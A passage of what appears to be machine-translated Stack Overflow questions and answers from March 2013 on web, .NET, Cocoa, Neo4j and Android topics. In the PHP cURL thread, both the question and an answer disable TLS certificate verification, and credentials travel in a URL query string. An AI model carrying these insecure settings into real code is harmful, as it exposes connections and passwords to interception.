有点有趣的是，原生 HTML5 音频/视频支持的冠军，不支持没有插件的 HTML5 音频/视频......

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-12T09:21:15.623

在 Safari 上的 HTML5 视频中，我遇到了一个问题，我必须在设置播放之前“加载”（我认为，要么启动缓冲区，要么加载整个内容）。这似乎实际上使事情在一些 webkit 浏览器中工作。所以像：

```
var a = new Audio("file.mp3");
a.load();
a.play(); 
```

值得一试

# html - 隐藏标签

> ID：15357198
> 
> 赞同：0
> 
> 时间：2013-03-12T09:12:42.047
> 
> 标签：html, css, input, label

我想禁用或隐藏标签的内容“分组”`<label>`而不影响嵌套`<input>`标签。

```
<label class="" for="officersheet_fields_attributes_3_grouping">
<input type="checkbox" id="officersheet_fields_attributes_3_grouping" name="officersheet[fields_attributes][3][grouping]" value="1">
Grouping
</label>` 
```

我在rails中使用formtastic。形式化的代码片段 `<td><%= f.input :grouping %></td>`

上面的行生成上面的 html。

提前致谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-12T09:14:01.247

您可以使用`text-indent: -1000em`.

```
label
{
    text-indent: -1000em;
} 
```

但我认为将输入放在标签内并不是一个好主意。最好有以下：

```
<input type="checkbox"/><label>Grouping</label> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-12T09:37:28.193

我也会选择跨度，但是如果您无法控制 html 结构，则可以执行以下操作：

```
$(document).ready(function () {
    $('label')
      .contents() 
      .each(function() { 
          // if (this.nodeType == Node.TEXT_NODE);  this works unless using IE 7
          if (this.nodeType === 3) {
              $(this).remove();
          }
      });
}); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-12T09:18:44.660

`span`在标签文本周围添加标签并将其隐藏

```
<label for="foo">
    <input type="checkbox" value="1"><span>Grouping</span>
</label> 
```

CSS

```
span{
    display:none 
} 
```

**[演示](http://jsfiddle.net/CmHRm/1/)**

# javascript - Ember.js 与 Websockets / socket.io。Ember API 调用 / 加载实时数据的推荐结构

> ID：15357207
> 
> 赞同：3
> 
> 时间：2013-03-12T09:12:59.610
> 
> 标签：javascript, ember.js, websocket, socket.io, ember-data

我正在尝试使用 socket.io 在 Ember.js 中集成来自服务器的实时数据更新。我发现[https://gist.github.com/brentjanderson/4360857](https://gist.github.com/brentjanderson/4360857)这是一个（据我所知不完整）适配器，用于处理客户端使用 socket.io 启动的服务器更新。在玩了一会儿之后，我设法让一些操作起作用。

因此，Ember.js 似乎有一个可交换的“适配器”层来从浏览器抽象更新并将它们持久保存到服务器，以开发人员需要的任何格式。Ember.js 是否有任何类型的层来处理反过来的更新，挂钩？需要做什么才能“正确”处理来自服务器的实时更新？

[顺便说一句，我正在考虑将 Ember.js 与 Meteor 用于即将到来的项目，并且对两者都只了解一点]

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-12T13:05:02.803

> Ember.js 是否有任何类型的层来处理反过来的更新，挂钩？

不，这没有单独的层。

> 需要做什么才能“正确”处理来自服务器的实时更新？

似乎还没有“官方”的方式来做到这一点。有一些很好的博客文章展示了如何与 pusher 集成。应该与 socket.io 几乎相同的模式

[http://www.kaspertidemann.com/integrating-pusher-with-ember-js/](http://www.kaspertidemann.com/integrating-pusher-with-ember-js/) [http://livsey.org/blog/2013/02/10/integrating-pusher-with-ember/](http://livsey.org/blog/2013/02/10/integrating-pusher-with-ember/)

另请查看此 github 项目以获取工作示例：[https ://github.com/devmynd/dashboard/blob/master/app/assets/javascripts/lib/pusher.js](https://github.com/devmynd/dashboard/blob/master/app/assets/javascripts/lib/pusher.js)

# phpfox - 我们如何在 phpfox 中创建自定义 sigup 页面？

> ID：15357210
> 
> 赞同：0
> 
> 时间：2013-03-12T09:13:04.550
> 
> 标签：phpfox

PHPfox 提供了从后端创建自定义页面的功能，但是如何将注册表单调用到自定义页面？请提供建议。

提前致谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-13T07:34:18.867

您可以在自己的页面中调用模板文件。我编写[了一个演示](https://github.com/purefan/foxadvisor/tree/master/nested-templates)模块来说明这一点，使用它您可以包含显示要注册的表单的模板。

但是，您是否有任何理由不想使用自定义模板（而不是默认模板）或 CSS 来进行您需要的更改？

# macos - 获取支持的文档类型

> ID：15357217
> 
> 赞同：1
> 
> 时间：2013-03-12T09:13:27.273
> 
> 标签：macos, cocoa, nsdocument, nsdocumentcontroller

您如何以编程方式获取 Cocoa 应用程序中所有支持的文档类型的列表？

我希望在其中找到它，`NSDocumentController`但最接近的似乎是子类`documentClassNames`列表`NSDocument`。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-12T09:31:00.827

编辑1：

如果您打开 Project.-Info.plist，那么您可以在那里找到文档类型。

这是一个 plist（键值对），您可以简单地获取这些值。

```
NSDictionary *infoDict=[[NSBundle mainBundle] infoDictionary];
NSArray *extensions=[infoDict valueForKeyPath:@"CFBundleDocumentTypes.CFBundleTypeExtensions"];
NSLog(@"ext:%@",extensions); 
```

![在此处输入图像描述](../Images/1a921010971bfde9b6e86b0c99c75d6c.png)

# php - PHP：使用 cURL PUT 发送 XML 数据

> ID：15357220
> 
> 赞同：0
> 
> 时间：2013-03-12T09:13:31.323
> 
> 标签：php, xml, ssl, curl

我想使用 API 更新我在 Sears 市场中的库存。

*"**库存管理：** 此 API 调用使用 PUT 方法来管理您的项目的库存水平。为避免错误，库存更新应该只对已成功处理的项目进行。注意：库存不会自动减少，因此重要的是您在您接收和处理订单时更新库存。”*

放置网址：`https://seller.marketplace.sears.com/SellerPortal/api/inventory/fbm-lmp/v6?email={emailaddress}&password={password}`

**XSD：** [https ://seller.marketplace.sears.com/SellerPortal/s/schema/rest/inventory/import/v6/store-inventory.xsd?view=markup](https://seller.marketplace.sears.com/SellerPortal/s/schema/rest/inventory/import/v6/store-inventory.xsd?view=markup)

**示例 XML：** [https ://seller.marketplace.sears.com/SellerPortal/s/schema/samples/rest/inventory/import/v6/store-inventory.xml?view=markup](https://seller.marketplace.sears.com/SellerPortal/s/schema/samples/rest/inventory/import/v6/store-inventory.xml?view=markup)

**API 文档：**
[http ://searsmarketplace.force.com/articles/FAQ/XML-How-do-I-update-inventory?retURL=%2Fapex%2FknowledgeProduct%3Fc%3DContent%26k%3D&popup=false](http://searsmarketplace.force.com/articles/FAQ/XML-How-do-I-update-inventory?retURL=%2Fapex%2FknowledgeProduct%3Fc%3DContent%26k%3D&popup=false)

我创建了以下脚本但无法正常工作：

```
$xml = '<?xml version="1.0" encoding="UTF-8"?>
    <store-inventory
        xmlns="http://seller.marketplace.sears.com/catalog/v2"
        xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
        xsi:schemaLocation="http://seller.marketplace.sears.com/SellerPortal/s/schema/rest/inventory/import/v2/store-inventory.xsd">
        <item item-id="10">
            <locations>
                <location location-id="21">
                    <quantity>20</quantity>
                    <pick-up-now-eligible>false</pick-up-now-eligible>
                </location>
            </locations>
        </item>
    </store-inventory>';

$ch = curl_init(); 
curl_setopt($ch, CURLOPT_VERBOSE, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
curl_setopt($ch, CURLOPT_URL, "https://seller.marketplace.sears.com/SellerPortal/api/inventory/fbm-lmp/v6?email={email}&password={pass}"); 
curl_setopt($ch, CURLOPT_PORT, 443);
curl_setopt($ch, CURLOPT_PUT, 1); 
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
curl_setopt($ch, CURLOPT_POSTFIELDS,array($xml));
$http_result = curl_exec($ch);
if($http_result){
    echo $http_result;
}else{
    echo curl_error($ch);
}

curl_close($ch); 
```

**卷曲错误：**

> 连接到 Seller.marketplace.sears.com:443 的未知 SSL 协议错误

我哪里错了？

* * *

## 回答 #1

> 赞同：-2
> 
> 时间：2013-03-12T09:47:06.723

你可以试试这个：

```
curl_setopt($ch, CURLOPT_FAILONERROR,1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION,1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$result = curl_exec($ch);
curl_close($ch); 
```

# c# - 列表错误 .RemoveAt()

> ID：15357222
> 
> 赞同：0
> 
> 时间：2013-03-12T09:13:35.943
> 
> 标签：c#, unity3d

```
lock("data"){
    if(_requestList.Count>1 && _requestList[1]==null){
        Debug.Log("why0");
    }
    _requestList.RemoveAt(0);
    if(_requestList.Count > 0 && _requestList[0] == null){
        Debug.Log("why1");
    }
    doSomething ();
} 
```

`_requestList`是一个字符串列表

有时它会记录“why0”，有时会记录“why1”，有时会记录两者，有时什么也不会。

添加的元素永远不会为空。

所以为什么？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-12T09:16:57.673

首先你需要使用一个

```
private readonly object lockObject = new object();

lock(lockObject)
{

} 
```

您还需要`lock(lockObject)`在要添加到列表的任何位置放置一个。

希望在某些方面有所帮助。

如果您不想担心线程，也可以查看[ConcurrentBag 。](http://msdn.microsoft.com/en-us/library/dd381779.aspx)

# ruby-on-rails - 活动导航菜单栏和 Anchestry

> ID：15357225
> 
> 赞同：0
> 
> 时间：2013-03-12T09:13:43.323
> 
> 标签：ruby-on-rails, categories, ancestry

我使用 Ancestry gem 为我的网站提供完整的分类功能。

此时我要创建导航菜单。

思路，是这样的。

我点击主类别，它导航到它，在那里我可以看到所有子类别。我点击其中之一。例如，打开其他子类别。

我希望能够在这样的导航栏上看到

```
Main category name -> Subcategory name -> subsub category name -> Product name 
```

Somethink like this，但我不知道如何在谷歌中搜索它，因为英语不是我的母语。主要思想是能够看到作为兄弟姐妹的类别树和子类别的父母:)

有人可以为我建议一些东西吗？:)

谢谢你 ！！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-12T09:30:17.057

**用于 Rails 的**简单灵活的面包屑。

 **您需要在点击导航时看到导航菜单。

然后使用[面包屑导航菜单](http://www.simonecarletti.com/code/breadcrumbs_on_rails/docs/)。

它使用起来更简单，无论您走到哪里，它都能为您提供您期望的导航。

有关安装和要求，请查看：

[https://github.com/weppos/breadcrumbs_on_rails#readme](https://github.com/weppos/breadcrumbs_on_rails#readme)**

# c# - 安装项目时如何将项目中包含的文件夹复制到另一个位置

> ID：15357227
> 
> 赞同：-4
> 
> 时间：2013-03-12T09:13:46.067
> 
> 标签：c#, reportviewer, rdlc

我们使用 c# 创建了 windows 应用程序。其中我们使用`Microsoft Report Viewer`和创建了很多报告`Rdlc Pages`。但是当我们在另一个系统中安装项目时，不会生成报告，因为它显示了一个错误，例如

> 找不到文件 Report.rdlc

那么如何解决呢？在我安装应用程序时，是否可以将我系统中包含 Rdlc 页面的文件夹复制到目标系统的指定位置？

或者

还有其他方法可以提供永久路径或相对路径吗？我使用 Microsoft Report Viewer 和 Rdlc 创建了报告。我的代码是

```
 reportViewer1.Reset();

            con.Open();
            Manufactures ds = new Manufactures();

            SqlCommand cmd = new SqlCommand("Stp_ManufacturerReport_Fetch", con);
            cmd.Parameters.AddWithValue("@CompName", cbCompName.Text);
            cmd.CommandType = CommandType.StoredProcedure;
            SqlDataAdapter da = new SqlDataAdapter(cmd);
            //da.Fill(ds, "Manufactures");
            DataTable dt = new DataTable();
            da.Fill(dt);
            reportViewer1.ProcessingMode = Microsoft.Reporting.WinForms.ProcessingMode.Local;
            reportViewer1.LocalReport.ReportPath = "D:\\Abhith\\TTS\\Cabin\\TTS form Beta\\TTS form Beta\\Manufacturer.rdlc";//PATH OF REPORT
            reportViewer1.LocalReport.DataSources.Clear();
            reportViewer1.LocalReport.DataSources.Add(new Microsoft.Reporting.WinForms.ReportDataSource("Manufactures_ManufacturerReport", dt));//FILLING SOURCE FOR REPORT
            reportViewer1.RefreshReport();//REFRESHING THE REPORT`. 
```

问题出在路径上。当我在另一个系统中使用此应用程序时，找不到路径。所以报告没有生成。任何解决方案？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-12T09:57:43.570

我已经`Build action`在我的`.rdlc`文件中指定了`Embedded Resource`，然后在代码中像这样引用它：

```
this.reportViewerScraps.LocalReport.ReportEmbeddedResource = "Backa_Artiklar_2.ScrapReportDocument.rdlc"; 
```

**编辑：**根据提问者评论添加信息

我`rdlc`在解决方案资源管理器中有文件：

![解决方案资源管理器中的 rdlc](../Images/ecc8e0fafd68aaafce62491dd0638581.png)

将您的代码行更改为：

```
reportViewer1.LocalReport.ReportEmbeddedResource = "<namespace>.Manufacturer.rdlc"; 
```

请记住更改`<namespace>`为您的应用程序命名空间

# git - 在 checkintool 中添加注释

> ID：15357229
> 
> 赞同：4
> 
> 时间：2013-03-12T09:13:54.727
> 
> 标签：git, git-tfs

最近，我转而使用 git-tfs，这样 TFS 就不再是一场噩梦了。:) 但是，我注意到一个烦人的细节，我似乎无法在文档和网络上进行搜索。

问题在于使用`git tfs checkintool`. 当 Visual Studio Check-in 对话框出现时，我过去的所有提交评论都会附加到当前评论中。

然后，我必须在签入前删除除最后一条评论之外的所有评论。

这可能是因为我使用的是 TFS 门控签到，但是我不确定。使用门控签入时，签入永远不会提交给服务器。我刚回来`Checkin cancelled!`。然后，一旦门控构建通过，我`git tfs pull`就会将所有内容合并在一起。

有没有其他人看过这个？清除评论痕迹的最佳操作是什么？

**更多信息：**

这确实与 TFS 门控签入有关。当门控签到被关闭时，我进行了一次签到，评论被清除了。

`git tfs pull`因此，我认为如果取消了许多签到并且随着时间的推移我做了很多请求，那么应该能够看到相同的行为。我认为本地主分支永远不会完全注册对服务器的推送。

有什么方法可以在本地表明这一点？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-12T09:42:56.493

不确定我是否完全理解您的工作流程，但您是否尝试过在 checkintool 中使用标志“--no-build-default-comment”？默认情况下，checkintool 会连接自上次它认为它与 tfs 同步以来的所有评论，但此标志会覆盖此行为，留下一个空对话框。

# c# - Null 到 Boolean IValueConverter 不起作用

> ID：15357234
> 
> 赞同：8
> 
> 时间：2013-03-12T09:14:17.327
> 
> 标签：c#, wpf, null, ivalueconverter

如何使用 IValueConverter 将空值转换为布尔值？

我正在使用 wpf 尝试显示一堆布尔值（在复选框中）。创建新记录时，这些值为空，并在复选框中显示为“不确定”。我希望空值出现并保存为“假”值。

我试图创建一个 NullToBoolean 转换器，它从数据库中获取空值并将它们显示为 false，**然后**在用户点击保存时将它们保存为 false。（本质上，我试图避免用户必须在复选框中单击两次（一次使其为真，然后再次使其为假）。这似乎适用于导入 - 即空值显示为假 - 但除非我做了两次点击跳舞，保存时数据库中的值不会改变。

我的转换器：

```
[ValueConversion(typeof(bool), typeof(bool))]
public class NullBooleanConverter : IValueConverter
{

  public object Convert(object value, Type targetType, object parameter, CultureInfo culture)
  {
    if (value != null)
    {
      return value;
    }
    return false;
  }

  public object ConvertBack(object value, Type targetType, object parameter, CultureInfo culture)
  {
    if (value != null)
    {
      return value;
    }
    return null;
  }
} 
```

我试图让转换器使用的复选框之一：

```
 <CheckBox Grid.Column="1" Grid.Row="0" Padding="5" Margin="5" VerticalAlignment="Center" Name="chkVarianceDescriptionProvided" IsThreeState="False">
      <CheckBox.IsChecked>
        <Binding Path="VarianceDescriptionProvided" Mode="TwoWay">
          <Binding.Converter>
            <utils:NullBooleanConverter />
          </Binding.Converter>
        </Binding>
      </CheckBox.IsChecked>
    </CheckBox> 
```

我不知道问题是因为我的代码错误，还是转换器认为没有任何改变，因此不需要`ConvertBack`. 我已经尝试了`Mode`使用 ConvertBack 进行转换的所有 s 和切换代码，但似乎没有任何效果。

有人可以指出我需要做些什么来解决这个问题吗？

* * *

## 回答 #1

> 赞同：22
> 
> 时间：2013-03-12T10:47:07.477

嗯，如果可以开箱即用，为什么要使用转换器？

```
<CheckBox IsChecked="{Binding VarianceDescriptionProvided, TargetNullValue=False}" /> 
```

有关更多信息，请查看[此处](http://msdn.microsoft.com/en-us/library/system.windows.data.bindingbase.targetnullvalue.aspx)。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-12T09:58:38.353

真正的问题是您一开始并没有初始化数据对象。不要“修复”，从一开始就做好；建设者很好（例如）。您还应该制作 ViewModels/DataModels，而不是直接使用您的模型（数据库等）。

```
public class MyObjectBuilder
{
     Checked _checked;

     public  MyObjectBuilder()
     {
          Reset()
     }

     private void Reset()
     { 
          _checked = new Checked(true); //etc
     }

     public MyObjectBuilder WithChecked(bool checked)
     {
          _checked = new Checked(checked);
     }

     public MyObject Build()
     {
         var built = new MyObject(){Checked = _checked;} 
         Reset();
         return built;
     }
} 
```

然后始终使用构建器进行初始化

```
myObjects.Add(new MyObjectBuilder().Build()); 
```

或者

```
myObjects.Add(_injectedBuilder.Build()); // Initialises Checked to default 
myObjects.Add(_injectedBuilder.WithChecked(true).Build()); //True 
```

虽然这不能解决您提出的问题，但它会以您可以单元测试的方式解决您的潜在问题。即您可以测试以确保添加到对象列表中的值始终被初始化。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-12T09:56:08.517

只需在执行数据绑定*之前*更正您的数据。这是唯一的选择。转换器只会使复选框显示为“未选中”并仅在您与控件交互时更新您的数据。例如：

```
foreach (var item in items)
{
    if (item.VarianceDescriptionProvided == null)
        item.VarianceDescriptionProvided = false;
} 
```

# neo4j - 创建唯一的时，Cypher foreach 似乎不会迭代集合

> ID：15357237
> 
> 赞同：2
> 
> 时间：2013-03-12T09:14:24.917
> 
> 标签：neo4j, cypher

对于以下查询：

```
START n=node(1) 
MATCH (n)-[:KNOWS]->(k), (n)-[:LOVES]->(l)
WITH collect(k) + collect(l) as friends, n
FOREACH(f in friends : create unique (n)-[:FRIEND]->(f)) 
```

（数据与console.neo4j.org 相同）我希望朋友是Morpheus 和Trinity，因此从Neo 到Morpheus 和Neo 到Trinity 创建了一个新的FRIEND 关系。但是，在执行查询时，只创建了一个关系（Neo-[:FRIEND]->Morpheus）。再次执行查询并创建另一个关系（Neo-[:FRIEND]->Trinity）

这是为什么？（使用 Neo4j 1.8.2）

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-12T14:12:58.950

我今天在更新日志中注意到这是一个错误，并已在最新的 1.9.M05 版本中修复。`Fixes #489 - CREATE UNIQUE does not work as expected inside FOREACH`

更多在[https://github.com/neo4j/neo4j/blob/master/packaging/standalone/standalone-enterprise/src/main/distribution/text/enterprise/CHANGES.txt](https://github.com/neo4j/neo4j/blob/master/packaging/standalone/standalone-enterprise/src/main/distribution/text/enterprise/CHANGES.txt)

# android - FlashLED 强度控制

> ID：15357241
> 
> 赞同：10
> 
> 时间：2013-03-12T09:14:32.697
> 
> 标签：android, android-intent, android-sdk-2.3, flashlight, android-hardware

我正在寻找 Android 相机 LED 闪光灯的帮助，以改变它的强度，就像[这个应用程序](https://play.google.com/store/apps/details?id=com.devuni.flashlight)一样。

我已经检查了以下链接，但我没有从中得到确切的结果。

1.  [我可以更改 Android 设备的 LED 强度吗？](https://stackoverflow.com/questions/5970188/can-i-change-the-led-intensity-of-an-android-device)
2.  [如何在 Android 中以编程方式打开相机闪光灯？](https://stackoverflow.com/questions/6068803/how-turn-on-camera-flash-light-programmatically-in-android)
3.  [http://code.google.com/p/droidled/source/checkout](http://code.google.com/p/droidled/source/checkout)
4.  [http://code.google.com/p/simpleled/source/checkout](http://code.google.com/p/simpleled/source/checkout)
5.  [https://code.google.com/p/openintents/source/checkout](https://code.google.com/p/openintents/source/checkout)

而且我无法执行[此链接](http://www.java2s.com/Open-Source/Android/Tools/quick-settings/com/bwx/bequick/flashlight/Catalogflashlight.htm)（对我来说似乎很有希望）。

任何帮助是极大的赞赏。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2014-08-30T10:03:06.100

[在这里](https://stackoverflow.com/questions/5970188/can-i-change-the-led-intensity-of-an-android-device/6959591#6959591)找到了答案

HTC 有一个支持此功能的替代 API，但它仅适用于 HTC Sense 设备，并且从 Gingerbread 开始，他们已更改权限，因此仅适用于他们的 Flashlight 应用程序，而不是第三方应用程序（除非您使用 root）。

但在 2.2 HTC 设备上，您可以通过将字符串写入`/sys/devices/platform/flashlight.0/leds/flashlight/brightness`. 这控制 LED 是否打开以及它的亮度。对于最大亮度写入`"128\n"`，一半亮度写入`"64\n"`。易于从 adb shell 测试：

```
echo "128" > /sys/devices/platform/flashlight.0/leds/flashlight/brightness 
```

最后通过在那里写来关闭它`"0\n"`。

# jsf - 如何在服务器端检查 ADF UIComponent 的可见性？

> ID：15357242
> 
> 赞同：1
> 
> 时间：2013-03-12T09:14:43.633
> 
> 标签：jsf, oracle-adf, trinidad

如果我有一个`UIComponent`（或者实际上是一个`UIXComponent`）实例，我如何检查它是否会呈现可见？检查`visible`组件上的属性并不总是有效，因为组件的父级之一也可能是不可见的。

为了澄清，我需要在渲染阶段和服务器端检查它。我已经设法编写了自己的递归函数来执行此操作，但我想知道在 ADF 中是否有一些内置方法可以执行此操作。（就像它是客户端 -`isShowing()`方法）

# rest - RESTFul 服务和跨域调用

> ID：15357251
> 
> 赞同：2
> 
> 时间：2013-03-12T09:15:22.617
> 
> 标签：rest, post, cross-domain, jsonp

要真正实现 RESTFul，服务应该遵守 REST 规则，例如为每个场景使用正确的 http 操作（GET、POST、PUT 等），例如使用 POST 创建新资源或使用 GET 获取资源而不修改全局状态。

但是，使用 JSONP 方法的跨域调用本质上只适用于 GET 操作。

您如何既尊重 REST 规则（这意味着我们可以拥有一些只能通过 POST 向它们发送数据才能访问的方法）并使您的服务接受跨域调用？是否有一些最佳实践来实现这一目标？

谢谢 ！

里亚纳

# eclipse - Vaadin Sizeable.Unit 在 Eclipse 中的奇怪外观

> ID：15357254
> 
> 赞同：1
> 
> 时间：2013-03-12T09:15:34.563
> 
> 标签：eclipse, vaadin

我正在从 Vaadin 6 迁移到 Vaadin 7，在这个过程中我发现了一件奇怪的事情。我有我的 Unit 类，并且在 Sizeable 接口中还有另一个同名的枚举。当我导入我的 Unit 类并尝试使用它时，Eclipse 会自动尝试使用 Sizeable.Unit 枚举而不是我的类。任何人都可以解释发生了什么吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-12T09:18:27.007

由于所有 Vaadin 组件都派生自`Sizeable`,`Sizeable.Unit`始终在范围内。您必须为自己的`Unit`类使用完全限定的名称。

# wpf - 当 DataGridRow 被选中时，如何对它的数据执行自定义操作？

> ID：15357255
> 
> 赞同：3
> 
> 时间：2013-03-12T09:15:38.343
> 
> 标签：wpf, data-binding, datagrid

我一直在试图弄清楚如何在在线搜索解决方案时将这种自定义行为放入数据网格中而无需多看。

给定以下数据网格（为简洁起见，删除了一些 xaml）：

```
<DataGrid ItemsSource="{Binding Items}" AutoGenerateColumns="False">
    <DataGrid.Columns>
        <DataGridTemplateColumn Width="auto">
            <DataGridTemplateColumn.HeaderTemplate>
                <DataTemplate>
                    <CheckBox />
                </DataTemplate>
            </DataGridTemplateColumn.HeaderTemplate>
            <DataGridTemplateColumn.CellTemplate>
                <DataTemplate>
                    <CheckBox IsChecked="{Binding Selected, Mode=TwoWay, UpdateSourceTrigger=PropertyChanged}" />
                </DataTemplate>
            </DataGridTemplateColumn.CellTemplate>
        </DataGridTemplateColumn>
    </DataGrid.Columns>
</DataGrid> 
```

我已将复选框成功绑定到每一行的数据绑定对象。（注意：我使用的是`DataGridTemplateColumn`而不是`DataGridCheckBoxColumn`这样你不需要双击来改变值）。

我想要实现的是能够在用户选择一行时勾选复选框/更新数据绑定对象的 Selected 属性。有效地使整行单击设置复选框的选中属性。理想情况下，如果可能的话，我想在没有代码隐藏文件的情况下执行此操作，因为我试图让我的代码尽可能干净。

如果可能的话，我想要的另一个功能是单击一行将切换它的选定属性，这样如果您单击另一个，前一个和新的一样保持选中状态。

任何帮助深表感谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-12T10:09:55.923

为了清楚起见。我明白了

> 如果可能的话，我想要的另一个功能是单击一行将切换它的选定属性，这样如果您单击另一个，前一个和新的一样保持选中状态。

in the way, that you want the CheckBox of the an item, respectively the `Selected`property on the items ViewModel, to stay selected, when the next DataGridRow is selected, but not the DataGridRow itself? 那是对的吗？

我的建议是扩展您`DataGrid`using * *WPF 行为**s 的行为（[这是一个很好的介绍](http://wpftutorial.net/Behaviors.html)。这样您可以保持代码隐藏清晰，但不必扭曲 XAML 以使其执行您想要的操作。

这基本上是行为的想法：编写可测试的代码，它不与您的具体视图耦合，但仍然允许您用“真实”代码而不是 XAML 编写复杂的东西。在我看来，您的案例是行为的典型任务。

你的行为可能看起来就这么简单。

```
public class CustomSelectionBehavior : Behavior<DataGrid>
{
    protected override void OnAttached()
    {
        // Set mode to single to be able to handle the cklicked item alone
        AssociatedObject.SelectionMode = DataGridSelectionMode.Single;
        AssociatedObject.SelectionChanged += AssociatedObject_SelectionChanged;
    }

    protected override void OnDetaching()
    {
        AssociatedObject.SelectionChanged -= AssociatedObject_SelectionChanged;
    }

    private void AssociatedObject_SelectionChanged(object sender, SelectionChangedEventArgs args)
    {
        // Get DataContext of selected row
        var item = args.AddedItems.OfType<ItemViewModel>();

        // Toggle Selected property
        item.Selected = !item.Selected;
    }
} 
```

将行为附加到您的特定 DataGrid，在 XAML 中完成：

```
<DataGrid ...>
    <i:Interaction.Behaviors>
        <b:CustomSelectionBehavior />
    </i:Interaction.Behaviors>
    ...
</DataGrid> 
```

你需要参考

```
System.Windows.Interactivity.dll 
```

它也包含`Behavior<T>`基类。

# nhibernate - 是否可以阻止 MassTransit 运行时服务要求 DTC？

> ID：15357259
> 
> 赞同：0
> 
> 时间：2013-03-12T09:15:48.787
> 
> 标签：nhibernate, msdtc, masstransit

我开始使用 MassTransit，需要使用 RuntimeServices 来管理订阅和超时。我正在安装的环境是一个面向外部的网络，使用防火墙划分为多个部分。

当前，要安装 RuntimeServices 的应用程序服务器和 SQL Server 没有打开允许分布式事务协调器 (DTC) 正常工作的 RPC 端口。

下面列出了我得到的完整异常，但重要的部分看起来是这样`System.Transactions.TransactionException: The operation is not valid for the state of the transaction.`。由于未配置 DTC，我不相信该交易会启动。

虽然我应该能够要求打开正确的端口，但我不愿意这样做，因为我并不关心为此目的的交易。所以理想情况下，我想告诉 MassTransit 或者可能是 nHibernate，我不需要分布式事务。

顺便说一句，我的 MS 消息队列是非事务性的。

欢迎任何帮助，谢谢，Rob

完整的异常堆栈跟踪：

`MassTransit.Context.ServiceBusReceiveContext-'System.Action'1[[MassTransit.IConsumeContext, MassTransit, Version=2.6.416.0, Culture=neutral, PublicKeyToken=null]]' threw an exception consuming message 'MassTransit.Context.ReceiveContext' NHibernate.Exceptions.GenericADOException: could not execute query [ select subscripti0_.CorrelationId as Correlat1_1_, subscripti0_.CurrentState as CurrentS2_1_, subscripti0_.ControlUri as ControlUri1_, subscripti0_.DataUri as DataUri1_ from dbo.SubscriptionClientSaga subscripti0_ where subscripti0_.CurrentState=? ] Name:p1 - Value:Active (State) [SQL: select subscripti0_.CorrelationId as Correlat1_1_, subscripti0_.CurrentState as CurrentS2_1_, subscripti0_.ControlUri as ControlUri1_, subscripti0_.DataUri as DataUri1_ from dbo.SubscriptionClientSaga subscripti0_ where subscripti0_.CurrentState=?] ---> System.Transactions.TransactionException: The operation is not valid for the state of the transaction. at System.Transactions.TransactionState.EnlistVolatile(InternalTransaction tx, IEnlistmentNotification enlistmentNotification, EnlistmentOptions enlistmentOptions, Transaction atomicTransaction) at System.Transactions.Transaction.EnlistVolatile(IEnlistmentNotification enlistmentNotification, EnlistmentOptions enlistmentOptions) at NHibernate.Transaction.AdoNetWithDistributedTransactionFactory.EnlistInDis tributedTransactionIfNeeded(ISessionImplementor session) at NHibernate.Impl.AbstractSessionImpl.EnlistInAmbientTransactionIfNeeded() at NHibernate.Impl.AbstractSessionImpl.CheckAndUpdateSessionStatus() at NHibernate.Impl.SessionImpl.get_Batcher() at NHibernate.Loader.Loader.GetResultSet(IDbCommand st, Boolean autoDiscoverTypes, Boolean callable, RowSelection selection, ISessionImplementor session) at NHibernate.Loader.Loader.DoQuery(ISessionImplementor session, QueryParameters queryParameters, Boolean returnProxies) at NHibernate.Loader.Loader.DoQueryAndInitializeNonLazyCollections(ISessionImplementor session, QueryParameters queryParameters, Boolean returnProxies) at NHibernate.Loader.Loader.DoList(ISessionImplementor session, QueryParameters queryParameters) --- End of inner exception stack trace --- at NHibernate.Loader.Loader.DoList(ISessionImplementor session, QueryParameters queryParameters) ... (elided for brevity!) ...`

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-12T13:15:02.473

在某些情况下，事务会自动升级为 DTC：http: [//msdn.microsoft.com/en-us/library/ms131083.aspx](http://msdn.microsoft.com/en-us/library/ms131083.aspx)

您绝对希望避免这种情况发生-它会破坏性能，选项：

*   订阅服务不是资源密集型的，在本地托管其数据库。
*   评估用于消息消费的范围，看能不能缩小
*   如果使用 MSMQ，请使用多播而不是订阅服务
*   考虑改用 RabbitMQ - 无需订阅服务

[https://groups.google.com/forum/?fromgroups#!forum/masstransit-discuss](https://groups.google.com/forum/?fromgroups#!forum/masstransit-discuss)是您可以快速获得 MassTransit 帮助的地方。

干杯，ET。

# amazon-web-services - 我可以自动部署到 AWS ElasticBeanstalk 吗？SSH 还是这样？

> ID：15357265
> 
> 赞同：2
> 
> 时间：2013-03-12T09:16:06.493
> 
> 标签：amazon-web-services, amazon-elastic-beanstalk

我有一个简单的 PHP 应用程序，它不使用任何数据库或其他任何东西。我有一个脚本，它要求我输入版本名称，然后使用网站创建 ZIP 并通过 Web 界面上传。我可以通过 SSH 上传到 ElasticBeanstalk 吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-12T14:20:37.320

